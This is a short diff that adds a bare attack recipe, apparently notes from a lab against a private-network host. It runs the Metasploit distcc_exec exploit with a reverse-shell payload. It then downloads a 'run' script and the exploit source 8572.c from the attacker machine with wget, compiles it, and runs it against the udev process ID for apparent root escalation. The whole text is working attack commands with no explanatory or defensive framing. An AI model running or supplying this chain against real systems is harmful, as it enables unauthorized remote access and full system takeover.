@@ -1,0 +1,12 @@
+use exploit/unix/misc/distcc_exec
+set RHOST 192.168.23.132
+set LHOST 192.168.23.131
+set payload cmd/unix/reverse
+exploit 
+
+wget http://192.168.23.131/run
+wget http://192.168.23.131/8572.c
+
+gcc -o exploit 8572.c
+pid=$(ps aux | grep udev | awk '{print $2}')
+./exploit "$pid"
